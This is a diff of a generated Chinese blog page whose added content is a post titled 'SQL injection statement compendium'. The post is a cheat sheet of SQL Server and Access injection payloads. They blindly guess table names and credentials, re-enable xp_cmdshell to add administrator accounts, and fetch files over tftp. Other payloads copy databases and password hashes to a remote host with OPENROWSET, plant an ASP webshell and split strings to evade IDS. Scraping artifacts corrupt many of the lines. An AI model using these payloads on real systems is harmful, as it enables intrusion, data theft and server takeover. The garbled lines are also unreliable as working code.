@@ -6,14 +6,18 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="http://yoursite.com">
-  <title>Archives: 2018/3 | welcome to here</title>
+  <title>sql注入语句大全 | welcome to here</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta property="og:type" content="website">
-<meta property="og:title" content="welcome to here">
-<meta property="og:url" content="http://yoursite.com/archives/2018/03/index.html">
+  <meta name="description" content="1.判断有无注入点">
+<meta property="og:type" content="article">
+<meta property="og:title" content="sql注入语句大全">
+<meta property="og:url" content="http://yoursite.com/2017/09/02/sql注入语句大全/index.html">
 <meta property="og:site_name" content="welcome to here">
+<meta property="og:description" content="1.判断有无注入点">
+<meta property="og:updated_time" content="2018-03-08T13:40:17.869Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="welcome to here">
+<meta name="twitter:title" content="sql注入语句大全">
+<meta name="twitter:description" content="1.判断有无注入点">
   
     <link rel="alternative" href="/atom.xml" title="welcome to here" type="application/atom+xml">
   
@@ -143,76 +147,258 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            
-  
-  
+            <article id="post-sql注入语句大全" class="article article-type-post " itemscope itemprop="blogPost">
+  <div class="article-inner">
     
-    
-      
-      
-      <section class="archives-wrap">
-        <div class="archive-year-wrap">
-          <a href="/archives/2018" class="archive-year">2018</a>
-        </div>
-        <div class="archives">
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2018/03/08/hello-world/" class="archive-article-date">
-  	<time datetime="2018-03-08T08:22:21.378Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-03-08</time>
-</a>
-        </div>
-    	 
+      <header class="article-header">
+        
   
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2018/03/08/hello-world/">Hello World</a>
+    <h1 class="article-title" itemprop="name">
+      sql注入语句大全
     </h1>
   
 
-        <div class="article-info info-on-right">
-          
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2018/03/06/渗透测试流程-1/" class="archive-article-date">
-  	<time datetime="2018-03-06T12:59:21.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-03-06</time>
+        
+        <a href="/2017/09/02/sql注入语句大全/" class="archive-article-date">
+  	<time datetime="2017-09-02T08:38:43.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2017-09-02</time>
 </a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2018/03/06/渗透测试流程-1/">渗透测试流程</a>
-    </h1>
-  
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>1.判断有无注入点<br><a id="more"></a><br>and 1=1 and 1=2</p>
+<p>2.猜表一般的表的名称无非是admin adminuser user pass password 等..<br>and 0&lt;&gt;(select count(<em>) from </em>)<br>and 0&lt;&gt;(select count(*) from admin) —判断是否存在admin这张表</p>
+<p>3.猜帐号数目 如果遇到0&lt; 返回正确页面 1&lt;返回错误页面说明帐号数目就是1个<br>and 0&lt;(select count(<em>) from admin)<br>and 1&lt;(select count(</em>) from admin)</p>
+<p>4.猜解字段名称 在len( ) 括号里面加上我们想到的字段名称.<br>and 1=(select count(<em>) from admin where len(</em>)&gt;0)–<br>and 1=(select count(<em>) from admin where len(用户字段名称name)&gt;0)<br>and 1=(select count(</em>) from admin where len(_blank&gt;密码字段名称password)&gt;0)</p>
+<p>5.猜解各个字段的长度 猜解长度就是把&gt;0变换 直到返回正确页面为止<br>and 1=(select count(<em>) from admin where len(</em>)&gt;0)<br>and 1=(select count(<em>) from admin where len(name)&gt;6) 错误<br>and 1=(select count(</em>) from admin where len(name)&gt;5) 正确 长度是6<br>and 1=(select count(*) from admin where len(name)=6) 正确</p>
+<p>and 1=(select count(<em>) from admin where len(password)&gt;11) 正确<br>and 1=(select count(</em>) from admin where len(password)&gt;12) 错误 长度是12<br>and 1=(select count(*) from admin where len(password)=12) 正确</p>
+<p>6.猜解字符<br>and 1=(select count(<em>) from admin where left(name,1)=a) —猜解用户帐号的第一位<br>and 1=(select count(</em>) from admin where left(name,2)=ab)—猜解用户帐号的第二位<br>就这样一次加一个字符这样猜,猜到够你刚才猜出来的多少位了就对了,帐号就算出来了<br>and 1=(select top 1 count(*) from Admin where Asc(mid(pass,5,1))=51) –<br>这个查询语句可以猜解中文的用户和_blank&gt;密码.只要把后面的数字换成中文的 ASSIC码就OK.最后把结果再转换成字符.</p>
+<p>group by users.id having 1=1–<br>group by users.id, users.username, users.password, users.privs having 1=1–<br>; insert into users values( 666, attacker, foobar, 0xffff )–</p>
+<p>UNION Select TOP 1 COLUMN_blank&gt;_NAME FROM INFORMATION_blank&gt;_SCHEMA.COLUMNS Where TABLE_blank&gt;_NAME=logintable-<br>UNION Select TOP 1 COLUMN_blank&gt;_NAME FROM INFORMATION_blank&gt;_SCHEMA.COLUMNS Where TABLE_blank&gt;_NAME=logintable Where COLUMN_blank&gt;_NAME NOT IN (login_blank&gt;_id)-<br>UNION Select TOP 1 COLUMN_blank&gt;_NAME FROM INFORMATION_blank&gt;_SCHEMA.COLUMNS Where TABLE_blank&gt;_NAME=logintable Where COLUMN_blank&gt;_NAME NOT IN (login_blank&gt;_id,login_blank&gt;_name)-<br>UNION Select TOP 1 login_blank&gt;_name FROM logintable-<br>UNION Select TOP 1 password FROM logintable where login_blank&gt;_name=Rahul–</p>
+<p>看_blank&gt;服务器打的补丁=出错了打了SP4补丁<br>and 1=(select @@VERSION)–</p>
+<p>看_blank&gt;数据库连接账号的权限，返回正常，证明是 _blank&gt;服务器角色sysadmin权限。<br>and 1=(Select IS_blank&gt;_SRVROLEMEMBER(sysadmin))–</p>
+<p>判断连接_blank&gt;数据库帐号。（采用SA账号连接 返回正常=证明了连接账号是SA）<br>and sa=(Select System_blank&gt;_user)–<br>and user_blank&gt;_name()=dbo–<br>and 0&lt;&gt;(select user_blank&gt;_name()–</p>
+<p>看xp_blank&gt;_cmdshell是否删除<br>and 1=(Select count(*) FROM master.dbo.sysobjects Where xtype = X AND name = xp_blank&gt;_cmdshell)–</p>
+<p>xp_blank&gt;_cmdshell被删除，恢复,支持绝对路径的恢复<br>;EXEC master.dbo.sp_blank&gt;_addextendedproc xp_blank&gt;_cmdshell,xplog70.dll–<br>;EXEC master.dbo.sp_blank&gt;_addextendedproc xp_blank&gt;_cmdshell,c:\inetpub\wwwroot\xplog70.dll–</p>
+<p>反向PING自己实验<br>;use master;declare @s int;exec sp_blank&gt;_oacreate “wscript.shell”,@s out;exec sp_blank&gt;_oamethod @s,”run”,NULL,”cmd.exe /c ping 192.168.0.1”;–</p>
+<p>加帐号<br>;DECLARE @shell INT EXEC SP_blank&gt;_OACreate wscript.shell,@shell OUTPUT EXEC SP_blank&gt;_OAMETHOD @shell,run,null, C:\WINNT\system32\cmd.exe /c net user jiaoniang$ 1866574 /add–</p>
+<p>创建一个虚拟目录E盘：<br>;declare @o int exec sp_blank&gt;_oacreate wscript.shell, @o out exec sp_blank&gt;_oamethod @o, run, NULL, cscript.exe c：\inetpub\wwwroot\mkwebdir.vbs -w “默认Web站点” -v “e”,”e：\”–</p>
+<p>访问属性：（配合写入一个webshell）<br>declare @o int exec sp_blank&gt;_oacreate wscript.shell, @o out exec sp_blank&gt;_oamethod @o, run, NULL, cscript.exe c：\inetpub\wwwroot\chaccess.vbs -a w3svc/1/ROOT/e +browse</p>
+<p>爆库 特殊_blank&gt;技巧：:%5c=\ 或者把/和\ 修改%5提交<br>and 0&lt;&gt;(select top 1 paths from newtable)–</p>
+<p>得到库名（从1到5都是系统的id，6以上才可以判断）<br>and 1=(select name from master.dbo.sysdatabases where dbid=7)–<br>and 0&lt;&gt;(select count(*) from master.dbo.sysdatabases where name&gt;1 and dbid=6)<br>依次提交 dbid = 7,8,9…. 得到更多的_blank&gt;数据库名</p>
+<p>and 0&lt;&gt;(select top 1 name from bbs.dbo.sysobjects where xtype=U) 暴到一个表 假设为 admin<br>and 0&lt;&gt;(select top 1 name from bbs.dbo.sysobjects where xtype=U and name not in (Admin)) 来得到其他的表。<br>and 0&lt;&gt;(select count(*) from bbs.dbo.sysobjects where xtype=U and name=admin<br>and uid&gt;(str(id))) 暴到UID的数值假设为18779569 uid=id<br>and 0&lt;&gt;(select top 1 name from bbs.dbo.syscolumns where id=18779569) 得到一个admin的一个字段,假设为 user_blank&gt;_id<br>and 0&lt;&gt;(select top 1 name from bbs.dbo.syscolumns where id=18779569 and name not in<br>(id,…)) 来暴出其他的字段<br>and 0&lt;(select user_blank&gt;_id from BBS.dbo.admin where username&gt;1) 可以得到用户名<br>依次可以得到_blank&gt;密码。。。。。假设存在 user_blank&gt;_id username ,password 等字段</p>
+<p>and 0&lt;&gt;(select count(<em>) from master.dbo.sysdatabases where name&gt;1 and dbid=6)<br>and 0&lt;&gt;(select top 1 name from bbs.dbo.sysobjects where xtype=U) 得到表名<br>and 0&lt;&gt;(select top 1 name from bbs.dbo.sysobjects where xtype=U and name not in(Address))<br>and 0&lt;&gt;(select count(</em>) from bbs.dbo.sysobjects where xtype=U and name=admin and uid&gt;(str(id))) 判断id值<br>and 0&lt;&gt;(select top 1 name from BBS.dbo.syscolumns where id=773577794) 所有字段</p>
+<p>?id=-1 union select 1,2,3,4,5,6,7,8,9,10,11,12,13,<em> from admin<br>?id=-1 union select 1,2,3,4,5,6,7,8,</em>,9,10,11,12,13 from admin (union，access也好用)</p>
+<p>得到WEB路径<br>;create table [dbo].[swap] ([swappass]<a href="255">char</a>);–<br>and (select top 1 swappass from swap)=1–<br>;Create TABLE newtable(id int IDENTITY(1,1),paths varchar(500)) Declare @test varchar(20) exec master..xp_blank&gt;_regread @rootkey=HKEY_blank&gt;_LOCAL_blank&gt;_MACHINE, @key=SYSTEM\CurrentControlSet\Services\W3SVC\Parameters\Virtual Roots\, @value_blank&gt;_name=/, values=@test OUTPUT insert into paths(path) values(@test)–<br>;use ku1;–<br>;create table cmd (str image);– 建立image类型的表cmd</p>
+<p>存在xp_blank&gt;_cmdshell的测试过程：<br>;exec master..xp_blank&gt;_cmdshell dir<br>;exec master.dbo.sp_blank&gt;_addlogin jiaoniang$;– 加SQL帐号<br>;exec master.dbo.sp_blank&gt;_password null,jiaoniang$,1866574;–<br>;exec master.dbo.sp_blank&gt;_addsrvrolemember jiaoniang$ sysadmin;–<br>;exec master.dbo.xp_blank&gt;_cmdshell net user jiaoniang$ 1866574 /workstations:* /times:all /passwordchg:yes /passwordreq:yes /active:yes /add;–<br>;exec master.dbo.xp_blank&gt;_cmdshell net localgroup administrators jiaoniang$ /add;–<br>exec master..xp_blank&gt;_servicecontrol start, schedule 启动_blank&gt;服务<br>exec master..xp_blank&gt;_servicecontrol start, server<br>; DECLARE @shell INT EXEC SP_blank&gt;_OACreate wscript.shell,@shell OUTPUT EXEC SP_blank&gt;_OAMETHOD @shell,run,null, C：\WINNT\system32\cmd.exe /c net user jiaoniang$ 1866574 /add<br>;DECLARE @shell INT EXEC SP_blank&gt;_OACreate wscript.shell,@shell OUTPUT EXEC SP_blank&gt;_OAMETHOD @shell,run,null, C：\WINNT\system32\cmd.exe /c net localgroup administrators jiaoniang$ /add<br>; exec master..xp_blank&gt;_cmdshell tftp -i youip get file.exe– 利用TFTP上传文件</p>
+<p>;declare @a sysname set @a=xp_blank&gt;_+cmdshell exec @a dir c:\<br>;declare @a sysname set @a=xp+_blank&gt;_cm’+’dshell exec @a dir c:\<br>;declare @a;set @a=db_blank&gt;_name();backup database @a to disk=你的IP你的共享目录bak.dat<br>如果被限制则可以。<br>select * from openrowset(_blank&gt;sqloledb,server;sa;,select OK! exec master.dbo.sp_blank&gt;_addlogin hax)</p>
+<p>查询构造：<br>Select <em> FROM news Where id=… AND topic=… AND …..<br>adminand 1=(select count(</em>) from [user] where username=victim and right(left(userpass,01),1)=1) and userpass &lt;&gt;<br>select 123;–<br>;use master;–<br>:a or name like fff%;– 显示有一个叫ffff的用户哈。<br>and 1&lt;&gt;(select count(email) from [user]);–<br>;update [users] set email=(select top 1 name from sysobjects where xtype=u and status&gt;0) where name=ffff;–<br>;update [users] set email=(select top 1 id from sysobjects where xtype=u and name=ad) where name=ffff;–<br>;update [users] set email=(select top 1 name from sysobjects where xtype=u and id&gt;581577110) where name=ffff;–<br>;update [users] set email=(select top 1 count(id) from password) where name=ffff;–<br>;update [users] set email=(select top 1 pwd from password where id=2) where name=ffff;–<br>;update [users] set email=(select top 1 name from password where id=2) where name=ffff;–<br>上面的语句是得到_blank&gt;数据库中的第一个用户表,并把表名放在ffff用户的邮箱字段中。<br>通过查看ffff的用户资料可得第一个用表叫ad<br>然后根据表名 ad得到这个表的ID 得到第二个表的名字</p>
+<p>insert into users values( 666, char(0x63)+char(0x68)+char(0x72)+char(0x69)+char(0x73), char(0x63)+char(0x68)+char(0x72)+char(0x69)+char(0x73), 0xffff)–<br>insert into users values( 667,123,123,0xffff)–<br>insert into users values ( 123, admin–, password, 0xffff)–<br>;and user&gt;0<br>;and (select count(<em>) from sysobjects)&gt;0<br>;and (select count(</em>) from mysysobjects)&gt;0 //为access_blank&gt;数据库</p>
+<p>枚举出数据表名<br>;update aaa set aaa=(select top 1 name from sysobjects where xtype=u and status&gt;0);–<br>这是将第一个表名更新到aaa的字段处。<br>读出第一个表，第二个表可以这样读出来（在条件后加上 and name&lt;&gt;刚才得到的表名）。<br>;update aaa set aaa=(select top 1 name from sysobjects where xtype=u and status&gt;0 and name&lt;&gt;vote);–<br>然后id=1552 and exists(select <em> from aaa where aaa&gt;5)<br>读出第二个表，一个个的读出，直到没有为止。<br>读字段是这样：<br>;update aaa set aaa=(select top 1 col_blank&gt;_name(object_blank&gt;_id(表名),1));–<br>然后id=152 and exists(select </em> from aaa where aaa&gt;5)出错，得到字段名<br>;update aaa set aaa=(select top 1 col_blank&gt;_name(object_blank&gt;_id(表名),2));–<br>然后id=152 and exists(select * from aaa where aaa&gt;5)出错，得到字段名</p>
+<p>[获得数据表名][将字段值更新为表名，再想法读出这个字段的值就可得到表名]<br>update 表名 set 字段=(select top 1 name from sysobjects where xtype=u and status&gt;0 [ and name&lt;&gt;你得到的表名 查出一个加一个]) [ where 条件] select top 1 name from sysobjects where xtype=u and status&gt;0 and name not in(table1,table2,…)<br>通过SQLSERVER注入_blank&gt;漏洞建_blank&gt;数据库管理员帐号和系统管理员帐号[当前帐号必须是SYSADMIN组]</p>
+<p>[获得数据表字段名][将字段值更新为字段名，再想法读出这个字段的值就可得到字段名]<br>update 表名 set 字段=(select top 1 col_blank&gt;_name(object_blank&gt;_id(要查询的数据表名),字段列如:1) [ where 条件]</p>
+<p>绕过IDS的检测[使用变量]<br>;declare @a sysname set @a=xp_blank&gt;_+cmdshell exec @a dir c:\<br>;declare @a sysname set @a=xp+_blank&gt;_cm’+’dshell exec @a dir c:\</p>
+<p>1、 开启远程_blank&gt;数据库<br>基本语法<br>select <em> from OPENROWSET(SQLOLEDB, server=servername;uid=sa;pwd=123, select </em> from table1 )<br>参数: (1) OLEDB Provider name<br>2、 其中连接字符串参数可以是任何端口用来连接,比如<br>select <em> from OPENROWSET(SQLOLEDB, uid=sa;pwd=123;Network=DBMSSOCN;Address=192.168.0.1,1433;, select </em> from table<br>3.复制目标主机的整个_blank&gt;数据库insert所有远程表到本地表。</p>
+<p>基本语法：<br>insert into OPENROWSET(SQLOLEDB, server=servername;uid=sa;pwd=123, select <em> from table1) select </em> from table2<br>这行语句将目标主机上table2表中的所有数据复制到远程_blank&gt;数据库中的table1表中。实际运用中适当修改连接字符串的IP地址和端口，指向需要的地方，比如：<br>insert into OPENROWSET(SQLOLEDB,uid=sa;pwd=123;Network=DBMSSOCN;Address=192.168.0.1,1433;,select <em> from table1) select </em> from table2<br>insert into OPENROWSET(SQLOLEDB,uid=sa;pwd=123;Network=DBMSSOCN;Address=192.168.0.1,1433;,select <em> from _blank&gt;_sysdatabases)<br>select </em> from master.dbo.sysdatabases<br>insert into OPENROWSET(SQLOLEDB,uid=sa;pwd=123;Network=DBMSSOCN;Address=192.168.0.1,1433;,select <em> from _blank&gt;_sysobjects)<br>select </em> from user_blank&gt;_database.dbo.sysobjects<br>insert into OPENROWSET(SQLOLEDB,uid=sa;pwd=123;Network=DBMSSOCN;Address=192.168.0.1,1433;,select <em> from _blank&gt;_syscolumns)<br>select </em> from user_blank&gt;_database.dbo.syscolumns<br>复制_blank&gt;数据库：<br>insert into OPENROWSET(SQLOLEDB,uid=sa;pwd=123;Network=DBMSSOCN;Address=192.168.0.1,1433;,select <em> from table1) select </em> from database..table1<br>insert into OPENROWSET(SQLOLEDB,uid=sa;pwd=123;Network=DBMSSOCN;Address=192.168.0.1,1433;,select <em> from table2) select </em> from database..table2</p>
+<p>复制哈西表（HASH）登录_blank&gt;密码的hash存储于sysxlogins中。方法如下：<br>insert into OPENROWSET(SQLOLEDB, uid=sa;pwd=123;Network=DBMSSOCN;Address=192.168.0.1,1433;,select <em> from _blank&gt;_sysxlogins) select </em> from database.dbo.sysxlogins<br>得到hash之后，就可以进行暴力破解。</p>
+<p>遍历目录的方法： 先创建一个临时表：temp<br>;create table temp(id nvarchar(255),num1 nvarchar(255),num2 nvarchar(255),num3 nvarchar(255));–<br>;insert temp exec master.dbo.xp_blank&gt;_availablemedia;– 获得当前所有驱动器<br>;insert into temp(id) exec master.dbo.xp_blank&gt;_subdirs c:\;– 获得子目录列表<br>;insert into temp(id,num1) exec master.dbo.xp_blank&gt;_dirtree c:\;– 获得所有子目录的目录树结构,并寸入temp表中<br>;insert into temp(id) exec master.dbo.xp_blank&gt;_cmdshell type c:\web\index.asp;– 查看某个文件的内容<br>;insert into temp(id) exec master.dbo.xp_blank&gt;_cmdshell dir c:\;–<br>;insert into temp(id) exec master.dbo.xp_blank&gt;_cmdshell dir c:\ *.asp /s/a;–<br>;insert into temp(id) exec master.dbo.xp_blank&gt;_cmdshell cscript C:\Inetpub\AdminScripts\adsutil.vbs enum w3svc<br>;insert into temp(id,num1) exec master.dbo.xp_blank&gt;_dirtree c:\;– （xp_blank&gt;_dirtree适用权限PUBLIC）<br>写入表：<br>语句1：and 1=(Select IS_blank&gt;_SRVROLEMEMBER(sysadmin));–<br>语句2：and 1=(Select IS_blank&gt;_SRVROLEMEMBER(serveradmin));–<br>语句3：and 1=(Select IS_blank&gt;_SRVROLEMEMBER(setupadmin));–<br>语句4：and 1=(Select IS_blank&gt;_SRVROLEMEMBER(securityadmin));–<br>语句5：and 1=(Select IS_blank&gt;_SRVROLEMEMBER(securityadmin));–<br>语句6：and 1=(Select IS_blank&gt;_SRVROLEMEMBER(diskadmin));–<br>语句7：and 1=(Select IS_blank&gt;_SRVROLEMEMBER(bulkadmin));–<br>语句8：and 1=(Select IS_blank&gt;_SRVROLEMEMBER(bulkadmin));–<br>语句9：and 1=(Select IS_blank&gt;_MEMBER(db_blank&gt;_owner));–</p>
+<p>把路径写到表中去：<br>;create table dirs(paths varchar(100), id int)–<br>;insert dirs exec master.dbo.xp_blank&gt;_dirtree c:--<br>and 0&lt;&gt;(select top 1 paths from dirs)–<br>and 0&lt;&gt;(select top 1 paths from dirs where paths not in(@Inetpub))–<br>;create table dirs1(paths varchar(100), id int)–<br>;insert dirs exec master.dbo.xp_blank&gt;_dirtree e:\web–<br>and 0&lt;&gt;(select top 1 paths from dirs1)–</p>
+<p>把_blank&gt;数据库备份到网页目录：下载<br>;declare @a sysname; set @a=db_blank&gt;_name();backup database @a to disk=e:\web\down.bak;–</p>
+<p>and 1=(Select top 1 name from(Select top 12 id,name from sysobjects where xtype=char(85)) T order by id desc)<br>and 1=(Select Top 1 col_blank&gt;_name(object_blank&gt;_id(USER_blank&gt;_LOGIN),1) from sysobjects) 参看相关表。<br>and 1=(select user_blank&gt;_id from USER_blank&gt;_LOGIN)<br>and 0=(select user from USER_blank&gt;_LOGIN where user&gt;1)</p>
+<p>-=- wscript.shell example -=-<br>declare @o int<br>exec sp_blank&gt;_oacreate wscript.shell, @o out<br>exec sp_blank&gt;_oamethod @o, run, NULL, notepad.exe<br>; declare @o int exec sp_blank&gt;_oacreate wscript.shell, @o out exec sp_blank&gt;_oamethod @o, run, NULL, notepad.exe–</p>
+<p>declare @o int, @f int, @t int, @ret int<br>declare @line varchar(8000)<br>exec sp_blank&gt;_oacreate scripting.filesystemobject, @o out<br>exec sp_blank&gt;_oamethod @o, opentextfile, @f out, c:\boot.ini, 1<br>exec @ret = sp_blank&gt;_oamethod @f, readline, @line out<br>while( @ret = 0 )<br>begin<br>print @line<br>exec @ret = sp_blank&gt;_oamethod @f, readline, @line out<br>end</p>
+<p>declare @o int, @f int, @t int, @ret int<br>exec sp_blank&gt;_oacreate scripting.filesystemobject, @o out<br>exec sp_blank&gt;_oamethod @o, createtextfile, @f out, c:\inetpub\wwwroot\foo.asp, 1<br>exec @ret = sp_blank&gt;_oamethod @f, writeline, NULL,<br>&lt;% set o = server.createobject(“wscript.shell”): o.run( request.querystring(“cmd”) ) %&gt;</p>
+<p>declare @o int, @ret int<br>exec sp_blank&gt;_oacreate speech.voicetext, @o out<br>exec sp_blank&gt;_oamethod @o, register, NULL, foo, bar<br>exec sp_blank&gt;_oasetproperty @o, speed, 150<br>exec sp_blank&gt;_oamethod @o, speak, NULL, all your sequel servers are belong to,us, 528<br>waitfor delay 00:00:05</p>
+<p>; declare @o int, @ret int exec sp_blank&gt;_oacreate speech.voicetext, @o out exec sp_blank&gt;_oamethod @o, register, NULL, foo, bar exec sp_blank&gt;_oasetproperty @o, speed, 150 exec sp_blank&gt;_oamethod @o, speak, NULL, all your sequel servers are belong to us, 528 waitfor delay 00:00:05–</p>
+<p>xp_blank&gt;_dirtree适用权限PUBLIC<br>exec master.dbo.xp_blank&gt;_dirtree c:返回的信息有两个字段subdirectory、depth。Subdirectory字段是字符型，depth字段是整形字段。<br>create table dirs(paths varchar(100), id int)<br>建表，这里建的表是和上面 xp_blank&gt;_dirtree相关连，字段相等、类型相同。<br>insert dirs exec master.dbo.xp_blank&gt;_dirtree c:只要我们建表与存储进程返回的字段相定义相等就能够执行！达到写表的效果,一步步达到我们想要的信息！</p>
 
-        <div class="article-info info-on-right">
-          
-          
+      
 
+      
+        <div class="page-reward">
+          <a href="javascript:;" class="page-reward-btn tooltip-top">
+            <div class="tooltip tooltip-east">
+            <span class="tooltip-item">
+              赏
+            </span>
+            <span class="tooltip-content">
+              <span class="tooltip-text">
+                <span class="tooltip-inner">
+                  <p class="reward-p"><i class="icon icon-quo-left"></i>谢谢请我吃糖<i class="icon icon-quo-right"></i></p>
+                  <div class="reward-box">
+                    
+                    
+                  </div>
+                </span>
+              </span>
+            </span>
+          </div>
+          </a>
         </div>
-        <div class="clearfix"></div>
-    </header>
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+
+      
+        
+<div class="share-btn share-icons tooltip-left">
+  <div class="tooltip tooltip-east">
+    <span class="tooltip-item">
+      <a href="javascript:;" class="share-sns share-outer">
+        <i class="icon icon-share"></i>
+      </a>
+    </span>
+    <span class="tooltip-content">
+      <div class="share-wrap">
+        <div class="share-icons">
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="icon icon-weibo"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="icon icon-weixin"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="icon icon-qq"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="icon icon-douban"></i>
+          </a>
+          <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a>
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="icon icon-facebook"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="icon icon-twitter"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="icon icon-google"></i>
+          </a>
+        </div>
+      </div>
+    </span>
+  </div>
+</div>
+
+<div class="page-modal wx-share js-wx-box">
+    <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="//pan.baidu.com/share/qrcode?url=http://yoursite.com/2017/09/02/sql注入语句大全/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div class="mask js-mask"></div>
+      
+      <div class="clearfix"></div>
+    </div>
   </div>
 </article>
+
+  
+<nav id="article-nav">
+  
+    <a href="/2017/09/21/unbuntu中tomcat安装过程/" id="article-nav-newer" class="article-nav-link-wrap">
+      <i class="icon-circle-left"></i>
+      <div class="article-nav-title">
+        
+          unbuntu中tomcat安装过程
+        
+      </div>
+    </a>
   
   
-    </div></section>
+</nav>
+
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+        <div class="toc-container tooltip-left">
+            <i class="icon-font icon-category"></i>
+            <div class="tooltip tooltip-east">
+                <span class="tooltip-item">
+                </span>
+                <span class="tooltip-content">
+                    <div class="toc-article">
+                    目录，不存在的…
+                    </div>
+                </span>
+            </div>
+        </div>
+        
+    </div>
+</aside>
+
+
+
+  
+  <div class="duoshuo">
+	<!-- 多说评论框 start -->
+	<div class="ds-thread" data-thread-key="sql注入语句大全" data-title="sql注入语句大全" data-url="http://yoursite.com/2017/09/02/sql注入语句大全/"></div>
+	<!-- 多说评论框 end -->
+	<!-- 多说公共JS代码 start (一个网页只需插入一次) -->
+	<script type="text/javascript">
+	var duoshuoQuery = {short_name:"true"};
+	(function() {
+		var ds = document.createElement('script');
+		ds.type = 'text/javascript';ds.async = true;
+		ds.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') + '//static.duoshuo.com/embed.js';
+		ds.charset = 'UTF-8';
+		(document.getElementsByTagName('head')[0] 
+		 || document.getElementsByTagName('body')[0]).appendChild(ds);
+	})();
+	</script>
+	<!-- 多说公共JS代码 end -->
+</div>
+
+  
+  
+  
+  <div id="cloud-tie-wrapper" class="cloud-tie-wrapper"></div>
+<script>
+  var cloudTieConfig = {
+    url: "http://yoursite.com/2017/09/02/sql注入语句大全/", 
+    sourceId: "sql注入语句大全",
+    productKey: "true",
+    target: "cloud-tie-wrapper"
+  };
+</script>
+<script src="//img1.cache.netease.com/f2e/tie/yun/sdk/loader.js"></script>
   
 
-    
+  
+  <div id="SOHUCS" sid="sql注入语句大全" ></div> 
+<script charset="utf-8" type="text/javascript" src="//changyan.sohu.com/upload/changyan.js" ></script>
+<script type="text/javascript">
+    window.changyan.api.config({
+        appid: "true",
+        conf: "true"
+    });
+</script>
+</script>
+  
+
+  
+
+  
 
 
           </div>
@@ -235,8 +421,8 @@
 	var yiliaConfig = {
 		mathjax: true,
 		isHome: false,
-		isPost: false,
-		isArchive: true,
+		isPost: true,
+		isArchive: false,
 		isTag: false,
 		isCategory: false,
 		open_in_new: false,
